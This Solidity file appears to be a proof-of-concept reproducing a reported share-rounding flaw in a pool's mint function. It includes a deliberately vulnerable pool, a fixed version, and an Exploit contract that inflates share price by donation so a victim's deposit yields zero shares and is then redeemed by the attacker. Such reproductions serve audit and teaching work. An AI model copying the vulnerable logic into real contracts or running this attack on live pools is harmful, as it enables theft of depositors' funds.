// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  NUTS Tapio SelfPeggingAsset.mint (MixBytes, January 2025).
    The first minter takes 1 share, then transfers tokens straight into the
    pool. The victim's mint checks minMintAmount against the token amount,
    while mintShares rounds the share amount down to 0. Redeeming the 1 share
    returns the donation and the victim's deposit.
*/

contract SpaToken {
    string public symbol = "SPA";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SelfPeggingAsset {
    SpaToken public immutable token;
    uint256 public totalShares;
    mapping(address => uint256) public sharesOf;

    constructor(SpaToken _token) {
        token = _token;
    }

    function mint(uint256 amount, uint256 minMintAmount) external returns (uint256 shares) {
        token.transferFrom(msg.sender, address(this), amount);
        uint256 supply = totalShares;
        if (supply == 0) {
            shares = amount;
        } else {
            uint256 bal = token.balanceOf(address(this));
            // @> VULN: share count rounds down. minMintAmount is checked on tokens, not shares.
            shares = amount * supply / bal;
        }
        require(amount >= minMintAmount, "min");
        totalShares = supply + shares;
        sharesOf[msg.sender] += shares;
    }

    function redeem(uint256 shares) external returns (uint256 out) {
        uint256 bal = token.balanceOf(address(this));
        out = shares * bal / totalShares;
        totalShares -= shares;
        sharesOf[msg.sender] -= shares;
        token.transfer(msg.sender, out);
    }
}

contract SelfPeggingAssetFixed {
    SpaToken public immutable token;
    uint256 public totalShares;
    mapping(address => uint256) public sharesOf;

    constructor(SpaToken _token) {
        token = _token;
    }

    function mint(uint256 amount, uint256 minMintAmount) external returns (uint256 shares) {
        token.transferFrom(msg.sender, address(this), amount);
        uint256 supply = totalShares;
        if (supply == 0) {
            shares = amount;
        } else {
            uint256 bal = token.balanceOf(address(this));
            shares = amount * supply / bal;
        }
        require(shares > 0, "zero shares");
        require(shares >= minMintAmount, "min shares");
        totalShares = supply + shares;
        sharesOf[msg.sender] += shares;
    }

    function redeem(uint256 shares) external returns (uint256 out) {
        uint256 bal = token.balanceOf(address(this));
        out = shares * bal / totalShares;
        totalShares -= shares;
        sharesOf[msg.sender] -= shares;
        token.transfer(msg.sender, out);
    }
}

contract SpaVictim {
    SpaToken public immutable token;
    SelfPeggingAsset public immutable pool;

    constructor(SpaToken _token, SelfPeggingAsset _pool) {
        token = _token;
        pool = _pool;
    }

    function mint(uint256 amount) external {
        token.approve(address(pool), amount);
        pool.mint(amount, amount);
    }
}

contract SpaVictimFixed {
    SpaToken public immutable token;
    SelfPeggingAssetFixed public immutable pool;

    constructor(SpaToken _token, SelfPeggingAssetFixed _pool) {
        token = _token;
        pool = _pool;
    }

    function mint(uint256 amount) external {
        token.approve(address(pool), amount);
        pool.mint(amount, amount);
    }
}

contract Exploit {
    uint256 public constant VICTIM_AMT = 1_000e18;
    SpaToken public token;
    SelfPeggingAsset public pool;
    SpaVictim public victim;

    constructor() {
        token = new SpaToken();
        pool = new SelfPeggingAsset(token);
        victim = new SpaVictim(token, pool);
        token.mint(address(this), 1 + VICTIM_AMT);
        token.mint(address(victim), VICTIM_AMT);
    }

    function run() external {
        token.approve(address(pool), type(uint256).max);
        uint256 minted = pool.mint(1, 0);
        require(minted == 1, "one share");
        token.transfer(address(pool), VICTIM_AMT);
        require(token.balanceOf(address(pool)) == 1 + VICTIM_AMT, "donated");
        victim.mint(VICTIM_AMT);
        require(pool.sharesOf(address(victim)) == 0, "victim shares 0");
        require(pool.totalShares() == 1, "supply still 1");
        uint256 out = pool.redeem(1);
        require(out == 1 + 2 * VICTIM_AMT, "redeemed both");
        require(token.balanceOf(address(this)) == 1 + 2 * VICTIM_AMT, "holds both");
        require(token.balanceOf(address(victim)) == 0, "victim paid 1000");
        require(token.balanceOf(address(pool)) == 0, "pool empty");
    }
}
